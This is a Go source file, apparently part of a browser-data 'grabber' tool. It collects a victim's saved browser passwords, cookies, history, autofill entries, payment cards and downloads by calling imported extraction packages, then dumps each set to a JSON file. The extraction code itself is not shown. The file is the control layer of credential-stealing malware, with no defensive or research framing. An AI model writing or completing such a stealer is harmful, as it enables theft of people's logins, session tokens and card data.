package browsers

import (
	"os"

	"example.com/grabber/browsers/autofill"
	"example.com/grabber/browsers/cards"
	"example.com/grabber/browsers/cookies"
	"example.com/grabber/browsers/downloads"
	"example.com/grabber/browsers/history"
	"example.com/grabber/browsers/pass"
)

func GetBrowserPasswords() {
	//fmt.Println(pass.GetPasswords())
	os.WriteFile("passwords.json", []byte(pass.Get()), 0644)
}

func GetBrowserCookies() {
	os.WriteFile("cookies.json", []byte(cookies.Get()), 0644)
}

func GetBrowserHistory() {
	//fmt.Println(history.GetHistory())
	os.WriteFile("history.json", []byte(history.Get()), 0644)
}

func GetBrowserAutofill() {
	os.WriteFile("autofill.json", []byte(autofill.Get()), 0644)
}

func GetBrowserCards() {
	os.WriteFile("cards.json", []byte(cards.Get()), 0644)
}

func GetBrowserDownloads() {
	os.WriteFile("downloads.json", []byte(downloads.Get()), 0644)
}

func GetBrowserData() {
	GetBrowserPasswords()
	GetBrowserHistory()
	GetBrowserCookies()
	GetBrowserDownloads()
	GetBrowserCards()
	GetBrowserAutofill()
}
